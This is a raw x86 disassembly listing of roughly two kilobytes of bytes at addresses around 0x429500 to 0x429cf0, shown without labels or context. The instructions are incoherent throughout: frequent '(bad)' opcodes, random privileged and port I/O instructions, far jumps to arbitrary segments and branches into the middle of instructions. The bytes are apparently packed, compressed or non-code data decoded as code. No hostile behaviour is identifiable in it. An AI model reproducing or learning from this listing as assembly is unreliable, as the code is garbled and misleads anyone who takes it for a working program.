  429501:	jl     0x42955e
  429503:	or     al,0x71
  429505:	cmp    BYTE PTR [eax-0x77fa6600],0xc0
  42950c:	push   ss
  42950d:	mov    al,0x51
  42950f:	hlt    
  429510:	test   eax,0xcfb542c7
  429515:	jbe    0x4294f2
  429517:	into   
  429518:	xor    ebp,DWORD PTR [eax]
  42951a:	push   esp
  42951b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42951c:	ficom  DWORD PTR [esi+0x48babd30]
  429522:	push   eax
  429523:	lods   al,BYTE PTR ds:[esi]
  429524:	bound  esp,QWORD PTR [eax-0x37a99e3f]
  42952a:	dec    edi
  42952b:	cwde   
  42952c:	int    0x9b
  42952e:	adc    DWORD PTR ds:0x1604fee8,edx
  429534:	jno    0x42955e
  429536:	add    ch,al
  429538:	adc    edx,DWORD PTR [edi+ebp*1]
  42953b:	add    eax,0x392e38b4
  429540:	hlt    
  429541:	retf   
  429542:	xor    al,0xa0
  429544:	lods   al,BYTE PTR ds:[esi]
  429545:	iret   
  429546:	push   eax
  429547:	xor    ecx,DWORD PTR [eax+0x7]
  42954a:	mov    ds:0x668624e0,al
  42954f:	cmp    ecx,DWORD PTR [esi]
  429551:	loop   0x42954d
  429553:	add    BYTE PTR [edi-0x6fa78368],bl
  429559:	or     BYTE PTR ds:0x81808814,dh
  42955f:	push   edx
  429560:	js     0x429553
  429562:	push   eax
  429563:	mov    esi,0x7609a2a8
  429568:	enter  0xb48e,0x72
  42956c:	jl     0x4294f9
  42956e:	push   0xffffffb4
  429570:	(bad)  
  429571:	pusha  
  429572:	mov    al,ds:0xd4880eab
  429577:	mov    edx,0xa25e7d02
  42957c:	inc    ebx
  42957d:	mov    dl,0xaa
  42957f:	push   edi
  429580:	dec    esi
  429581:	push   0x16
  429583:	jb     0x4295f1
  429585:	test   al,0x6a
  429587:	or     BYTE PTR [eax+0x450b5852],ah
  42958d:	test   dl,0xb3
  429590:	shl    DWORD PTR [esi],1
  429592:	hlt    
  429593:	not    DWORD PTR ds:0x2ed192f2
  429599:	xlat   BYTE PTR ds:[ebx]
  42959a:	cs cmp edx,esp
  42959d:	add    al,0xda
  42959f:	(bad)  [edx-0x76]
  4295a2:	in     al,dx
  4295a3:	and    al,0x1d
  4295a5:	xchg   DWORD PTR [eax+0x81ac002],esi
  4295ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295ac:	sbb    bl,al
  4295ae:	add    eax,0xba54caad
  4295b3:	lea    ebx,[eax-0x3a]
  4295b6:	leave  
  4295b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295b8:	sub    edx,edx
  4295ba:	in     eax,dx
  4295bb:	scas   al,BYTE PTR es:[edi]
  4295bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295bd:	mov    cl,BYTE PTR ds:0xbea8591a
  4295c3:	(bad)  
  4295c4:	xor    al,0xaf
  4295c6:	and    BYTE PTR [eax+0x1d],ch
  4295c9:	or     eax,0x14faf1a6
  4295ce:	xor    eax,0x2e0a60f6
  4295d3:	push   ebp
  4295d4:	ins    DWORD PTR es:[edi],dx
  4295d5:	imul   ebp,DWORD PTR [eax-0x56],0x7d
  4295d9:	sub    edx,DWORD PTR ds:[esi]
  4295dc:	jp     0x429568
  4295de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295df:	(bad)  
  4295e0:	cld    
  4295e1:	imul   bp,WORD PTR [ecx+0x6a00e66d],0x3f
  4295e9:	retf   0x2fb
  4295ec:	mov    esi,0xa9ada650
  4295f1:	push   ebp
  4295f2:	mov    ch,0xa1
  4295f4:	or     cl,ch
  4295f6:	shl    BYTE PTR [eax],cl
  4295f8:	(bad)  
  4295f9:	mov    bh,0x58
  4295fb:	lods   al,BYTE PTR ss:[esi]
  4295fd:	push   ds
  4295fe:	sub    ch,BYTE PTR [eax+0x51]
  429601:	mov    bl,0x2a
  429603:	pop    eax
  429604:	mov    esi,0xaa28b01b
  429609:	or     ch,BYTE PTR [edi+0x60]
  42960c:	in     eax,0xd
  42960e:	adc    BYTE PTR [esi+0x0],0x4a
  429612:	popa   
  429613:	fwait
  429614:	pushf  
  429615:	adc    dh,0xaa
  429618:	pop    ss
  429619:	fldcw  WORD PTR [edx]
  42961b:	xchg   edi,eax
  42961c:	xor    al,0x74
  42961e:	repz call 0xeae0:0xdcdeeb00
  429626:	push   0x1d
  429628:	lahf   
  429629:	shl    DWORD PTR ds:[eax-0xb],0x16
  42962e:	ret    0xf2bc
  429631:	jae    0x4295e0
  429633:	test   al,0x68
  429635:	loop   0x429606
  429637:	xor    al,0xac
  429639:	jo     0x4295ec
  42963b:	(bad)  
  42963c:	xchg   edx,eax
  42963d:	call   0x46ab3cf7
  429642:	xlat   BYTE PTR ds:[ebx]
  429643:	xor    BYTE PTR [ecx],ch
  429645:	pop    esi
  429646:	xor    al,0x5d
  429648:	cs mov cl,0x0
  42964b:	push   eax
  42964c:	xor    al,0x55
  42964e:	cmp    al,0x62
  429650:	loop   0x429604
  429652:	add    al,0x56
  429654:	adc    al,0xa0
  429656:	mov    eax,ds:0x7c74cb82
  42965b:	and    ch,BYTE PTR [eax-0x75938672]
  429661:	or     ebp,ecx
  429663:	xchg   ecx,eax
  429664:	je     0x4296a7
  429666:	aad    0x40
  429668:	inc    esi
  429669:	and    cl,BYTE PTR [edi+0x42]
  42966c:	mov    bh,0xa5
  42966e:	jnp    0x4296ac
  429670:	cmp    ecx,eax
  429672:	(bad)  [eax]
  429674:	add    BYTE PTR [eax-0x4d2c67f3],dh
  42967a:	jo     0x42967a
  42967c:	xor    dl,BYTE PTR [esi+0x34]
  42967f:	out    dx,eax
  429680:	cld    
  429681:	mov    esi,0xa3eb00bb
  429686:	push   ss
  429687:	xchg   ebp,eax
  429688:	mov    BYTE PTR [ebx+0x607c7340],cl
  42968e:	sahf   
  42968f:	mov    bh,0x3c
  429691:	push   0xffffff9b
  429693:	xchg   edi,eax
  429694:	mov    eax,ds:0x94f0a0ab
  429699:	jmp    0x42b0:0xe483881
  4296a0:	inc    ebx
  4296a1:	push   ebx
  4296a2:	push   ecx
  4296a3:	mov    ebp,0xad5e4cd4
  4296a8:	out    0x37,al
  4296aa:	cmc    
  4296ab:	xchg   edx,eax
  4296ac:	pop    eax
  4296ad:	and    ah,bh
  4296af:	ss ins DWORD PTR es:[edi],dx
  4296b1:	jmp    0x8345e7f4
  4296b6:	add    BYTE PTR [esi+0x40],0x48
  4296ba:	loopne 0x42965e
  4296bc:	inc    esi
  4296bd:	(bad)  
  4296be:	rcl    ebp,1
  4296c0:	jmp    0x4296e7
  4296c2:	adc    esi,DWORD PTR [ebx]
  4296c4:	pop    esi
  4296c5:	push   0x287f3014
  4296ca:	sahf   
  4296cb:	mov    eax,ds:0x7102c60f
  4296d0:	fdivr  QWORD PTR [edx]
  4296d2:	shl    BYTE PTR [eax],1
  4296d4:	and    bl,BYTE PTR [edx+ecx*1]
  4296d7:	or     ecx,DWORD PTR [edx]
  4296d9:	mov    ah,0x42
  4296db:	jle    0x42969e
  4296dd:	or     BYTE PTR [esi-0x3f4fafcb],al
  4296e3:	jbe    0x429763
  4296e5:	dec    ecx
  4296e6:	inc    esp
  4296e7:	mov    al,ds:0xf6104ac6
  4296ec:	mov    BYTE PTR [eax+0x65],dl
  4296ef:	fcomp  DWORD PTR [esi+0x70ac2e74]
  4296f5:	jle    0x4296ef
  4296f7:	mov    ds:0xc282107d,al
  4296fc:	push   esi
  4296fd:	mov    ds:0x1666d01e,al
  429702:	ss retf 0x8816
  429706:	and    al,0x5a
  429708:	xchg   edx,eax
  429709:	sub    ch,BYTE PTR [edi]
  42970b:	stos   DWORD PTR es:[edi],eax
  42970c:	push   0xffffffe2
  42970e:	adc    eax,0x968aa9b4
  429713:	pushf  
  429714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429715:	mov    ch,0x22
  429717:	icebp  
  429718:	dec    ecx
  429719:	dec    eax
  42971a:	add    eax,0xd44c9615
  42971f:	sahf   
  429720:	fmul   DWORD PTR [eax-0x1d578fd3]
  429726:	cmp    BYTE PTR [edi-0x2d9f1b06],0xc4
  42972d:	xchg   edx,eax
  42972e:	retf   0xf685
  429731:	sub    al,0xa4
  429733:	dec    esp
  429734:	bound  edx,QWORD PTR fs:[ebx+eax*2-0x754a7a3b]
  42973c:	ret    
  42973d:	sbb    DWORD PTR [edx],esi
  42973f:	pop    ebx
  429740:	add    al,0x19
  429742:	xor    cl,BYTE PTR [edx]
  429744:	ins    BYTE PTR es:[edi],dx
  429745:	xchg   ebp,eax
  429746:	popa   
  429747:	ror    BYTE PTR [eax+ebx*1],1
  42974a:	not    cl
  42974c:	push   edx
  42974d:	mov    dl,0x7e
  42974f:	mov    BYTE PTR [ecx],0x68
  429752:	cmp    edi,DWORD PTR [edx]
  429754:	test   BYTE PTR [ebx],dl
  429756:	ss or  eax,0xea78e2a6
  42975c:	js     0x429760
  42975e:	push   ds
  42975f:	stos   BYTE PTR es:[edi],al
  429760:	out    dx,eax
  429761:	lea    esp,[ecx+edx*1]
  429764:	and    al,0x3c
  429766:	jmp    0xa00c:0x5ceb6065
  42976d:	and    eax,0x51fff9dd
  429772:	loopne 0x4297ce
  429774:	loopne 0x429774
  429776:	fsubrp st(1),st
  429778:	sub    eax,0x98746692
  42977d:	sub    DWORD PTR [ebp+0x20ff8254],esp
  429783:	mov    al,dl
  429785:	(bad)  
  429787:	ss push eax
  429789:	jle    0x4297ae
  42978b:	inc    esi
  42978c:	mov    ebx,0x16003196
  429791:	and    dh,BYTE PTR [esi-0x6727700b]
  429797:	lds    edx,FWORD PTR [ebp-0x7e]
  42979a:	call   0x8c219835
  42979f:	mov    ah,0xa3
  4297a1:	inc    ecx
  4297a2:	pusha  
  4297a3:	or     BYTE PTR [eax-0x32],ah
  4297a6:	jecxz  0x4297a4
  4297a8:	inc    ecx
  4297a9:	sub    DWORD PTR [ecx+0x51],edx
  4297ac:	dec    ecx
  4297ad:	cmp    eax,0x70d7d0c0
  4297b2:	jg     0x42976b
  4297b4:	jbe    0x4297ea
  4297b6:	mov    eax,ds:0xa218284e
  4297bb:	lods   al,BYTE PTR ds:[esi]
  4297bc:	pop    esp
  4297bd:	fimul  WORD PTR [ebx+ebp*2]
  4297c0:	ins    DWORD PTR es:[edi],dx
  4297c1:	(bad)  
  4297c2:	sar    ah,1
  4297c4:	stos   DWORD PTR es:[edi],eax
  4297c5:	push   ebx
  4297c6:	(bad)  
  4297c7:	cmp    edx,esp
  4297c9:	inc    ebp
  4297ca:	pop    eax
  4297cb:	adc    al,0x34
  4297cd:	adc    al,0x89
  4297cf:	(bad)  
  4297d0:	sub    al,0x2f
  4297d2:	mov    esp,0xacf0123f
  4297d7:	mov    ds:0x3e1e7899,al
  4297dc:	jae    0x42978a
  4297de:	(bad)  
  4297df:	cli    
  4297e0:	cmp    eax,DWORD PTR [ebx+ebx*4]
  4297e3:	call   0xf0dc:0xd646a582
  4297ea:	push   esp
  4297eb:	jp     0x42978e
  4297ed:	or     edi,DWORD PTR [edx+0x2f5c45da]
  4297f3:	add    BYTE PTR [esi+0x4332b68e],ch
  4297f9:	pushf  
  4297fa:	mov    al,0x22
  4297fc:	jmp    0x42983f
  4297fe:	pop    eax
  4297ff:	popa   
  429800:	sbb    al,0x4c
  429802:	pop    edi
  429803:	jo     0x429817
  429805:	and    BYTE PTR [ebx+ebx*2+0xd],dh
  429809:	lods   eax,DWORD PTR ds:[esi]
  42980a:	repnz enter 0x9358,0xce
  42980f:	or     eax,0xaa0111be
  429814:	ds add esp,eax
  429817:	in     eax,0x90
  429819:	stos   BYTE PTR es:[edi],al
  42981a:	lods   al,BYTE PTR ds:[esi]
  42981b:	pop    edi
  42981c:	add    al,0x9a
  42981e:	jg     0x42982f
  429820:	cli    
  429821:	add    BYTE PTR [eax],bh
  429823:	in     al,0x0
  429825:	in     al,dx
  429826:	mov    edx,0x512d0c35
  42982b:	pusha  
  42982c:	mov    edi,0x2c5a3aac
  429831:	sub    DWORD PTR [edx+0xd137b6c],eax
  429837:	pop    edi
  429838:	pop    eax
  429839:	mov    es,WORD PTR [ebx+0x1ae530ad]
  42983f:	xlat   BYTE PTR ds:[ebx]
  429840:	mov    al,ds:0x5c3068c2
  429845:	cwde   
  429846:	mov    esp,0x18e3a6ae
  42984b:	js     0x429876
  42984d:	retf   0xcc66
  429850:	push   0x2a050de0
  429855:	mov    ds:0xea2a8290,al
  42985a:	mov    ds:0xb655f914,eax
  42985f:	mov    ds:0x7e8fbe00,eax
  429864:	fwait
  429865:	mov    ds:0x64db0004,al
  42986a:	sbb    eax,0xb844a8bf
  42986f:	mov    cl,BYTE PTR [edi-0x4f1d3a3a]
  429875:	jmp    0x429849
  429877:	pop    edx
  429878:	push   eax
  429879:	inc    ebp
  42987a:	inc    esi
  42987b:	add    BYTE PTR [eax-0x5e061508],ch
  429881:	sar    DWORD PTR [eax],1
  429883:	xor    ah,dh
  429885:	aaa    
  429886:	inc    esp
  429887:	pushf  
  429888:	sar    DWORD PTR [eax],0xc2
  42988b:	addr16 or al,0x82
  42988e:	int3   
  42988f:	push   es
  429890:	dec    ebp
  429891:	les    eax,FWORD PTR [edx-0x6d]
  429894:	stos   BYTE PTR es:[edi],al
  429895:	mov    ?,WORD PTR [edx+0x72]
  429898:	push   edx
  429899:	cld    
  42989a:	mov    esi,0xa8a1a0b
  42989f:	mov    edx,0x92572625
  4298a4:	adc    eax,0x196a3c8a
  4298a9:	push   esi
  4298aa:	jl     0x4298bd
  4298ac:	cwde   
  4298ad:	call   0x4b14:0x5cef18dc
  4298b4:	push   esi
  4298b5:	inc    ebp
  4298b6:	adc    al,0xde
  4298b8:	push   0xffffff84
  4298ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298bb:	mov    ebx,0x1c091f5c
  4298c0:	inc    ecx
  4298c1:	(bad)  [edx-0x50]
  4298c4:	lods   al,BYTE PTR ds:[esi]
  4298c5:	or     dl,BYTE PTR [esp+esi*2]
  4298c8:	jl     0x429922
  4298ca:	jl     0x4298d4
  4298cc:	jmp    0x4dc0:0xa170fc59
  4298d3:	adc    eax,0x54740318
  4298d8:	push   ecx
  4298d9:	adc    DWORD PTR [eax+eax*4-0x53],edx
  4298dd:	clc    
  4298de:	and    esi,DWORD PTR [eax-0x18]
  4298e1:	mov    DWORD PTR [eax],ebp
  4298e3:	call   0x5680:0xa030696
  4298ea:	loopne 0x42993a
  4298ec:	ficom  DWORD PTR ds:0x6bb6c322
  4298f2:	jo     0x429957
  4298f4:	and    dh,BYTE PTR gs:[esi+ebx*2]
  4298f8:	aad    0xd6
  4298fa:	adc    al,0x6a
  4298fc:	add    eax,0x65dccd90
  429901:	cs add al,0x6c
  429904:	inc    eax
  429905:	push   esi
  429906:	xor    eax,0x5e90b554
  42990b:	cld    
  42990c:	ss pushf 
  42990e:	mov    ebx,gs
  429910:	jle    0x4298d5
  429912:	cmc    
  429913:	xor    eax,0x56b956b8
  429918:	lock dec esp
  42991a:	push   0x957fe098
  42991f:	enter  0x1574,0x56
  429923:	and    al,0x68
  429925:	and    DWORD PTR [eax-0x52],0x366051d6
  42992c:	inc    esi
  42992d:	sub    eax,0x4e136c98
  429932:	or     eax,esp
  429934:	ins    BYTE PTR es:[edi],dx
  429935:	push   edi
  429936:	add    dl,bl
  429938:	sar    DWORD PTR es:[edx],1
  42993b:	cli    
  42993c:	jle    0x429924
  42993e:	hlt    
  42993f:	cli    
  429940:	(bad)  
  429941:	out    0xdf,al
  429943:	mov    esi,0xa6cb2204
  429948:	and    esi,DWORD PTR [edi]
  42994a:	add    BYTE PTR [eax-0x53],dh
  42994d:	add    dl,ch
  42994f:	mov    al,0x47
  429951:	inc    edi
  429952:	jae    0x4299ae
  429954:	enter  0x584c,0x4e
  429958:	loop   0x4298de
  42995a:	mov    ds:0x646cd4d6,al
  42995f:	pop    esp
  429960:	inc    esi
  429961:	retf   0x465c
  429964:	inc    ecx
  429965:	push   0xfffffff1
  429967:	push   esi
  429968:	push   esi
  429969:	xor    al,0x5b
  42996b:	sbb    BYTE PTR [ecx+0x3ae44810],0x1c
  429972:	pop    esi
  429973:	retf   0x1b4d
  429976:	ins    BYTE PTR es:[edi],dx
  429977:	xor    BYTE PTR [esi+edx*8-0x76c52124],dh
  42997e:	push   ss
  42997f:	ja     0x42992b
  429981:	push   esi
  429982:	pop    edi
  429983:	adc    al,0x8
  429985:	in     eax,dx
  429986:	sub    BYTE PTR [eax+0x24],dh
  429989:	sbb    BYTE PTR [ecx],bh
  42998b:	cld    
  42998c:	div    BYTE PTR [eax-0x75fa92e]
  429992:	mov    al,ds:0xcd62104
  429997:	inc    esi
  429998:	cli    
  429999:	mov    dl,0x33
  42999b:	shl    DWORD PTR [ebx],0x81
  42999e:	bswap  esi
  4299a0:	and    ecx,ebx
  4299a2:	mov    dl,0xed
  4299a4:	jmp    0x7b4f:0x629a8106
  4299ab:	adc    BYTE PTR [edx],ah
  4299ad:	sbb    eax,esi
  4299af:	loopne 0x42993f
  4299b1:	mov    es,WORD PTR [edx+0x27a47ba2]
  4299b7:	(bad)  
  4299b8:	jae    0x4299e4
  4299ba:	je     0x429a04
  4299bc:	mov    al,ds:0x4bb54048
  4299c1:	hlt    
  4299c2:	inc    esp
  4299c3:	push   eax
  4299c4:	out    0xbb,al
  4299c6:	push   0xffffffab
  4299c8:	inc    eax
  4299c9:	mov    ch,0x72
  4299cb:	cld    
  4299cc:	inc    eax
  4299cd:	fadd   DWORD PTR [edx+0x38]
  4299d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4299d1:	mov    ss,WORD PTR [ebp+0x45]
  4299d4:	dec    ebp
  4299d5:	rcr    bh,1
  4299d7:	sub    BYTE PTR [edx],0x90
  4299da:	rol    ebx,cl
  4299dc:	xor    cl,dl
  4299de:	scas   al,BYTE PTR es:[edi]
  4299df:	pop    ss
  4299e0:	cdq    
  4299e1:	or     bl,BYTE PTR [esi-0x33ff6e57]
  4299e7:	xchg   edx,eax
  4299e8:	std    
  4299e9:	xchg   DWORD PTR [edx+0x701261da],ebp
  4299ef:	in     eax,0x0
  4299f1:	rcr    BYTE PTR [eax+ebp*4-0x497ef262],cl
  4299f8:	jmp    0x429a4d
  4299fa:	loop   0x429a5c
  4299fc:	xchg   BYTE PTR [eax],dh
  4299fe:	sub    al,0x4
  429a00:	cld    
  429a01:	inc    ebp
  429a02:	rcr    ebx,0x83
  429a05:	jp     0x4299a8
  429a07:	jl     0x429a0b
  429a09:	retf   
  429a0a:	add    BYTE PTR [ecx-0x5feff3b2],dl
  429a10:	rcr    BYTE PTR [eax+0x68],1
  429a13:	(bad)  
  429a14:	cli    
  429a15:	sbb    al,0x9c
  429a17:	repz push edx
  429a19:	dec    edx
  429a1a:	or     eax,0xa0a842ad
  429a1f:	out    dx,al
  429a20:	loopne 0x429a26
  429a22:	inc    esp
  429a23:	cmp    ch,BYTE PTR [eax+edx*4+0x12ce3e2a]
  429a2a:	xor    bl,ah
  429a2c:	ins    BYTE PTR es:[edi],dx
  429a2d:	jnp    0x429a10
  429a2f:	pop    edx
  429a30:	pusha  
  429a31:	cmp    edx,edx
  429a33:	pop    ss
  429a34:	sub    eax,0x5a392a04
  429a39:	push   0xd0062450
  429a3e:	cmp    al,0x51
  429a40:	ficom  WORD PTR [edx-0x28a2b22f]
  429a46:	fsub   DWORD PTR [ebx+edi*8+0x1b]
  429a4a:	stos   BYTE PTR es:[edi],al
  429a4b:	inc    ebx
  429a4c:	out    0x3,al
  429a4e:	and    bl,BYTE PTR [eax+esi*2+0x72]
  429a52:	sub    eax,0xc6dff468
  429a57:	paddd  mm5,QWORD PTR [esi-0x18]
  429a5b:	mov    dl,ch
  429a5d:	loopne 0x429a39
  429a5f:	into   
  429a60:	or     esp,esi
  429a62:	and    BYTE PTR [esi],bh
  429a64:	mov    al,BYTE PTR [eax]
  429a66:	sar    esi,cl
  429a68:	int    0x29
  429a6a:	enter  0x66a,0x28
  429a6e:	or     esp,0xf76000
  429a74:	popf   
  429a75:	mov    fs,WORD PTR [eax+0x3c61d682]
  429a7b:	iret   
  429a7c:	inc    eax
  429a7d:	adc    cl,ah
  429a7f:	sub    dh,cl
  429a81:	or     BYTE PTR [ebp+0x603cac3a],ch
  429a87:	call   0x281:0x430a8985
  429a8e:	cmp    eax,0xfd8788b0
  429a93:	and    al,0xd0
  429a95:	sbb    al,dh
  429a97:	aam    0x46
  429a99:	adc    eax,edi
  429a9b:	jb     0x429a46
  429a9d:	ss mov ah,0x68
  429aa0:	fwait
  429aa1:	jo     0x429b0d
  429aa3:	jecxz  0x429b09
  429aa5:	cmp    ch,BYTE PTR [ebx+esi*4+0x3c]
  429aa9:	(bad)  
  429aaa:	test   al,0x9f
  429aac:	sub    BYTE PTR ds:0x98baa975,dl
  429ab2:	in     al,0xce
  429ab4:	aam    0xad
  429ab6:	push   0x2ca2c8b6
  429abb:	in     eax,dx
  429abc:	imul   ebx,DWORD PTR [esi+ebx*2],0x74559a11
  429ac3:	lds    edx,FWORD PTR [edx+0x2b]
  429ac6:	jo     0x429b42
  429ac8:	fcom   st(6)
  429aca:	xor    al,0xf1
  429acc:	mov    ah,0x78
  429ace:	add    dh,BYTE PTR [esi]
  429ad0:	pop    ss
  429ad1:	popa   
  429ad2:	retf   0x2e80
  429ad5:	sbb    edx,DWORD PTR [esi+ebx*2+0x10]
  429ad9:	js     0x429a72
  429adb:	lods   al,BYTE PTR ds:[esi]
  429adc:	sbb    dl,ah
  429ade:	push   ecx
  429adf:	out    0xf7,al
  429ae1:	jns    0x429a97
  429ae3:	test   al,0xa1
  429ae5:	leave  
  429ae6:	cmp    ah,BYTE PTR [esi+0x224f203]
  429aec:	mov    esp,0xd760818c
  429af1:	test   esi,ebp
  429af3:	frstor [edi+eiz*1+0x56364ec8]
  429afa:	jo     0x429b29
  429afc:	pusha  
  429afd:	dec    edx
  429afe:	push   es
  429aff:	ins    BYTE PTR es:[edi],dx
  429b00:	inc    ebp
  429b01:	add    BYTE PTR [edi],ch
  429b03:	push   edx
  429b04:	jmp    0xdbd6:0x4eb4369a
  429b0b:	lods   al,BYTE PTR ds:[esi]
  429b0d:	call   0x72f5da4c
  429b12:	sub    dl,0x52
  429b15:	lods   eax,DWORD PTR ds:[esi]
  429b16:	nop
  429b17:	out    dx,eax
  429b18:	loop   0x429b10
  429b1a:	cwde   
  429b1b:	into   
  429b1c:	sbb    DWORD PTR [edx+0x10],ebx
  429b1f:	lods   eax,DWORD PTR ds:[esi]
  429b20:	cmp    BYTE PTR [ebx-0x36],al
  429b23:	(bad)  
  429b24:	pop    esi
  429b25:	push   0x66b4c1b6
  429b2a:	fs push ss
  429b2c:	mov    dl,0x3e
  429b2e:	outs   dx,BYTE PTR ds:[esi]
  429b2f:	mov    bl,0x46
  429b31:	les    ecx,FWORD PTR [ebp+0x6aaa6a2b]
  429b37:	sub    al,0x81
  429b39:	xor    BYTE PTR [edx+ebp*2-0x14],dh
  429b3d:	cmp    BYTE PTR [esi],ch
  429b3f:	or     ch,BYTE PTR [ebp-0x11755d27]
  429b45:	ins    DWORD PTR es:[edi],dx
  429b46:	mov    dh,0x94
  429b48:	jl     0x429b60
  429b4a:	mov    dl,0x76
  429b4c:	call   0xd880872
  429b51:	push   ebp
  429b52:	xor    BYTE PTR [eax+edi*8+0x3402bc97],al
  429b59:	mov    ebx,DWORD PTR [edi-0x28]
  429b5c:	cmp    bl,BYTE PTR [eax+edx*1]
  429b5f:	loopne 0x429bc5
  429b61:	or     al,0x1c
  429b63:	sbb    al,0x8f
  429b65:	daa    
  429b66:	mov    dh,0xa9
  429b68:	loop   0x429b32
  429b6a:	xor    al,0x2
  429b6c:	mov    BYTE PTR [edx+0xacc0994],bl
  429b72:	rcr    BYTE PTR [esi],1
  429b74:	test   eax,0xf0133415
  429b79:	xchg   edx,eax
  429b7a:	sbb    edx,DWORD PTR [esi]
  429b7c:	scas   eax,DWORD PTR es:[edi]
  429b7d:	mov    eax,ds:0xd254d514
  429b82:	add    esp,DWORD PTR [eax+0x50026e05]
  429b88:	push   ecx
  429b89:	push   eax
  429b8a:	cs in  eax,dx
  429b8c:	nop
  429b8d:	adc    ah,BYTE PTR [esi-0x7232fd6e]
  429b93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b95:	jl     0x429b60
  429b97:	lods   al,BYTE PTR cs:[esi]
  429b99:	stos   BYTE PTR es:[edi],al
  429b9a:	ins    BYTE PTR es:[edi],dx
  429b9b:	or     eax,0xf01c4605
  429ba0:	mov    cl,0x38
  429ba2:	js     0x429c20
  429ba4:	mov    ds:0xa2b2e87a,eax
  429ba9:	ja     0x429bd5
  429bab:	inc    edi
  429bac:	add    BYTE PTR [eax],ch
  429bae:	adc    esp,0xf3b06a35
  429bb4:	cli    
  429bb5:	and    eax,0xf58a2aad
  429bba:	cmp    al,0x44
  429bbc:	aas    
  429bbd:	push   esi
  429bbe:	pop    ebx
  429bbf:	scas   al,BYTE PTR es:[edi]
  429bc0:	mov    ch,0x93
  429bc2:	rol    al,0xa
  429bc5:	and    BYTE PTR [eax],bh
  429bc7:	dec    edx
  429bc8:	jo     0x429bb6
  429bca:	mov    dl,0x4d
  429bcc:	inc    edx
  429bcd:	retf   0x243b
  429bd0:	les    edi,FWORD PTR [eax]
  429bd2:	adc    BYTE PTR [ebp+0x18],cl
  429bd5:	fld    DWORD PTR [edx-0x7b9fcfaa]
  429bdb:	test   DWORD PTR [edx],ecx
  429bdd:	push   es
  429bde:	mov    edx,0x43f4d880
  429be3:	and    eax,0x895c7554
  429be8:	inc    ax
  429bea:	push   ss
  429beb:	popa   
  429bec:	adc    DWORD PTR [edx+0x2e],0xddccc888
  429bf3:	cmp    DWORD PTR [edx+0x33],ebx
  429bf6:	fild   QWORD PTR [esi+eiz*8-0x1b7de3e0]
  429bfd:	cmp    eax,0x16f42700
  429c02:	rcl    dh,cl
  429c04:	out    dx,eax
  429c05:	shl    BYTE PTR [edx],0x1
  429c08:	shl    BYTE PTR [ecx+eax*2+0x44],1
  429c0c:	dec    edx
  429c0d:	push   ebp
  429c0e:	xchg   edx,eax
  429c0f:	sbb    BYTE PTR [esi],dh
  429c11:	cld    
  429c12:	mov    DWORD PTR [esi+0x39],ebp
  429c15:	inc    DWORD PTR [eax]
  429c17:	xchg   BYTE PTR [esi-0x2c],dl
  429c1a:	(bad)  
  429c1b:	mov    dh,0x68
  429c1d:	adc    eax,0x3c015ad
  429c22:	sbb    al,0xb4
  429c24:	(bad)  
  429c25:	dec    ecx
  429c26:	xor    al,0x8f
  429c28:	xor    al,0x22
  429c2a:	ss pop ss
  429c2c:	in     al,dx
  429c2d:	int    0x18
  429c2f:	sbb    eax,0x88803d00
  429c34:	mov    dh,BYTE PTR [esi+0x44]
  429c37:	scas   eax,DWORD PTR es:[edi]
  429c38:	push   0x102a0497
  429c3d:	or     al,0x66
  429c3f:	enter  0x52e,0x80
  429c43:	pusha  
  429c44:	jmp    0x429c6e
  429c46:	data16 mov dh,0x3c
  429c49:	cmp    BYTE PTR [edx],cl
  429c4b:	mov    ebx,0xa10130ec
  429c50:	mov    al,ds:0xf6c046c9
  429c55:	mov    eax,ds:0x8e3a9502
  429c5a:	or     BYTE PTR [ebx],dh
  429c5c:	in     al,0xbf
  429c5e:	ficom  WORD PTR [edi+edx*2+0x14]
  429c62:	xor    eax,0x3b04d6b4
  429c67:	push   eax
  429c68:	scas   al,BYTE PTR es:[edi]
  429c69:	ds ins DWORD PTR es:[edi],dx
  429c6b:	jl     0x429c27
  429c6d:	in     eax,dx
  429c6e:	add    BYTE PTR [edi],cl
  429c70:	push   eax
  429c71:	(bad)  
  429c72:	mov    dh,BYTE PTR [ecx]
  429c74:	les    esi,FWORD PTR [ecx-0x4b88b705]
  429c7a:	cmp    al,ch
  429c7c:	sub    BYTE PTR [eax+0x58bf3468],ch
  429c82:	mov    ds:0xe72acde,eax
  429c87:	sbb    bh,BYTE PTR [esi-0x57edd400]
  429c8d:	mov    ecx,0xdf868750
  429c92:	ins    DWORD PTR es:[edi],dx
  429c93:	jge    0x429cd6
  429c95:	cmp    edx,DWORD PTR [esi-0x61c93167]
  429c9b:	lods   eax,DWORD PTR ds:[esi]
  429c9c:	dec    eax
  429c9d:	mov    cl,0xc3
  429c9f:	mov    dl,0x1e
  429ca1:	test   ch,0xc4
  429ca4:	outs   dx,BYTE PTR ds:[esi]
  429ca5:	inc    ebp
  429ca6:	pop    eax
  429ca7:	mul    al
  429ca9:	js     0x429cc0
  429cab:	mov    ch,BYTE PTR [esi]
  429cad:	out    dx,al
  429cae:	shl    BYTE PTR [edi],1
  429cb0:	or     ch,BYTE PTR [eax+ebp*4+0x26e550da]
  429cb7:	inc    eax
  429cb8:	cmp    al,0xfd
  429cba:	mov    esp,0x5d4dc823
  429cbf:	test   BYTE PTR [ebx],0x2a
  429cc2:	add    al,0x9b
  429cc4:	or     al,BYTE PTR [edx+ebp*2-0x72]
  429cc8:	jecxz  0x429d34
  429cca:	adc    BYTE PTR ds:0x825d200d,0xec
  429cd1:	add    ah,BYTE PTR [edx-0x71654ade]
  429cd7:	or     DWORD PTR [eax+edi*8],ebp
  429cda:	addr16 xchg ebp,eax
  429cdc:	adc    BYTE PTR [ebp+0x76],bh
  429cdf:	(bad)  
  429ce1:	and    dl,bl
  429ce3:	sub    bh,BYTE PTR [edx]
  429ce5:	xor    al,0x6a
  429ce7:	aas    
  429ce8:	rol    dl,1
  429cea:	outs   dx,BYTE PTR ds:[esi]
  429ceb:	jmp    0x429ca5
  429ced:	mov    ch,BYTE PTR [edx-0x4b6e7d5a]
